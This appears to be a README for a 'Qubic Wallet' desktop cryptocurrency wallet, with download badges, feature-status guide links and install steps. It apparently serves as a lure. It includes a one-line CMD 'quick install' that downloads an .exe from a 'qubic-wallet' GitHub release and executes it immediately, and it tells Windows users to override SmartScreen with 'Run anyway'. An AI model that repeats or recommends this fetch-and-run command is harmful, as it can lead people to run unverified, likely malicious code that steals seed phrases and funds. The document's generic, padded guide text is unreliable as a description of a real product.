![Qubic Wallet](assets/qubic-wallet-download-seed-phrase-install-address-article-banner.png)

# Qubic Wallet features and platform support

What the wallet holds, what it supports today and what it does not ship yet.

<p align="center"><a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/LICENSE"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) |

> Half of this repository is about what the wallet holds and half is about what the build does not do yet.
> The status pages exist because a missing feature described as missing is more useful than one described
> as coming soon.

## What this repository is for

Ten guides on the product surface: which assets the desktop wallet can hold, how Qubic assets differ from
the QU coin, what QX trading looks like inside the client, and where each half-built feature actually
stands. The status pages are the point of the repository. A wallet guide that describes a workflow the
current build does not implement sends people looking for a button that is not there, and then to a
support thread that guesses.

Each guide is written against the current release and says which version it describes. Where a feature is
present but limited, the page states the limit rather than the feature name; where a feature is absent,
the page says so and describes what people do instead. A page that says "not available" is doing its job:
it saves the reader the search through menus that would otherwise end in a support thread guessing. That is why several pages here read shorter than
their titles suggest: there is only so much to say about a capability that has not shipped.

Two habits make the status pages easier to use. The first is to read the date and version line before the
body, because a status page is a statement about one build and not about the product's direction. The
second is to stop at the answer: if a page says a feature is absent, the useful next question is what
people do instead, which the page also answers, rather than whether a setting somewhere enables it.

The asset pages are the exception to that rule, because the asset model is genuinely the most confusing
part of the product for a new user. QU is not a token contract, QX and QTRY are not the same kind of
thing, and the wallet displays them in a way that makes the difference easy to miss. Those pages spend
their length on the distinction rather than on steps.

## Who it is for?

- Users who want to know whether the wallet supports a feature before they need it.
- People holding more than QU and unsure what the other assets in the list actually are.
- Anyone who has read that a feature exists and cannot find it in the current build.
- Users deciding whether the desktop wallet covers their workflow at all.

## Start here

- [The assets Qubic Wallet can hold: QU, QX, QTRY, QFT and more](qubic-wallet-token-assets-list.md) - the
  asset list explained, including which entries are coins, which are tokens and why that matters.
- [QUBIC coin vs Qubic assets: what your wallet actually holds](qubic-wallet-coin-vs-token.md) - the
  distinction that explains most confusion about balances and transfers in the wallet.
- [Trading on QX inside Qubic Wallet: order book, assets and limits](qubic-wallet-qx-trading-orderbook.md) -
  the trading screen as it exists in this build, with the limits stated rather than implied.
- [Is there a Qubic wallet app for iOS and Android?](qubic-wallet-app-mobile-status.md) - the mobile answer
  as a status page, including what to use in the meantime.

## How to use these guides

1. Read the asset list before the trading page; the vocabulary comes from there.
2. Treat status pages as version-specific and check the release note when a page matters to you.
3. If a feature is marked absent, do not look for a hidden setting; the page states what exists.
4. Use the QX page for what the screen does, not for what a trade should cost.
5. When a page and the current build disagree, the build wins; the release is the reference.
6. If you are choosing a wallet rather than checking one, read the asset page before the status pages: a
   missing feature only matters if it is the one you were counting on.

## The guides

### Assets and what they mean

- [The assets Qubic Wallet can hold: QU, QX, QTRY, QFT and more](qubic-wallet-token-assets-list.md) - the
  full asset list, what each entry represents and how the wallet groups them.
- [QUBIC coin vs Qubic assets: what your wallet actually holds](qubic-wallet-coin-vs-token.md) - why the
  coin and the assets behave differently, and what that changes about a transfer.
- [QUBIC contract address: why there is none and what to use instead](qubic-wallet-contract-address.md) -
  the contract-address question answered from the protocol rather than from Ethereum habits.

### Trading inside the wallet

- [Trading on QX inside Qubic Wallet: order book, assets and limits](qubic-wallet-qx-trading-orderbook.md) -
  the order book screen, the asset pairs it covers and the limits the build enforces.

### Status pages

- [Batch transactions in Qubic Wallet: what the build supports today](qubic-wallet-batch-transaction-status.md) -
  what batch handling exists, and what the page would say differently if it shipped.
- [Qearn staking and Qubic Wallet: what works, what doesn't](qubic-wallet-qearn-staking-status.md) - the
  staking position, stated as a status rather than a tutorial for a flow that is not there.
- [MSVault multi-signature and Qubic Wallet: current support](qubic-wallet-msvault-multisig-status.md) -
  whether multi-signature accounts can be created or used from this build.
- [Watch-only accounts in Qubic Wallet](qubic-wallet-watch-only-status.md) - what watching an account
  without its seed would require, and where the build stands on it.

### Platforms

- [Is there a Qubic wallet app for iOS and Android?](qubic-wallet-app-mobile-status.md) - the mobile answer,
  including what the desktop build does and does not substitute for.
- [Is there a Qubic Wallet browser extension?](qubic-wallet-browser-extension.md) - extension support as a
  status page, and the security question that would come with one.

## What each guide changes

| Question | Guide | Outcome |
| --- | --- | --- |
| What can the wallet hold? | [Asset list](qubic-wallet-token-assets-list.md) | You can name each asset and its type |
| Why is QU different? | [Coin vs token](qubic-wallet-coin-vs-token.md) | The transfer difference makes sense |
| Can I trade here? | [QX trading](qubic-wallet-qx-trading-orderbook.md) | You know what the screen offers today |
| Is staking available? | [Qearn status](qubic-wallet-qearn-staking-status.md) | A yes or no, with what the page is based on |
| Can I use it on my phone? | [Mobile status](qubic-wallet-app-mobile-status.md) | An answer instead of an expectation |
| Is there a browser extension? | [Extension status](qubic-wallet-browser-extension.md) | The current position, stated plainly |

## Common first questions

### Does the wallet support every asset in the Qubic ecosystem?

No, and the asset list is the authoritative answer for this build. It names what the wallet can hold now
rather than what the protocol could eventually carry.

### Why can I not find the staking screen?

Because it is not in this build. The Qearn page is a status page: it records the position and does not
describe a workflow you can follow today.

### Is QX trading the same as a centralised exchange?

No. It is an order book on the Qubic network, reached from inside the wallet, with the limits the page
lists. Settlement and custody behave differently from an exchange account.

### Will there be a mobile app?

The mobile page states what exists now and does not forecast a release. Treat any timeline you read
elsewhere as unverified until it appears on the release page.

## Before you install

- Check the asset page against the assets you actually hold.
- Read the status page for any feature you are counting on before you rely on it.
- Keep the release page open when a screen does not match a guide.
- If a workflow matters to you, confirm it exists in your build rather than in a description of one.
- Note which build you are on; a status page that does not match your version is a different answer.
- Read the QX limits before you plan a trade size, not after the order is placed.
- Treat any feature you read about elsewhere as unverified until a page here or the release says so.

## How to install Qubic Wallet

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

### Windows

Manual install:

1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

The macOS build ships as a .zip archive, so there is no one-line command that both downloads and launches it. Extract it first, then open the app.

1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a>.
2. Double-click the .zip to extract it.
3. Move the extracted app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux build ships as a .zip archive as well; extract it and run the binary inside.

1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip">qubic-wallet-desktop-v0.8.2-linux-x64.zip</a>.
2. Extract the archive.
3. Make the extracted binary executable.
4. Run it.


## About and license

Qubic Wallet is the desktop wallet for Qubic: seed-based accounts, local key storage and the QX trading screen, on Windows, macOS and Linux.

These guides are published under the MIT license; the full text is in the repository `LICENSE` file. Nothing here is an audit or an endorsement, and every claim is checked against the release, the repository or the client constants rather than repeated from marketing.
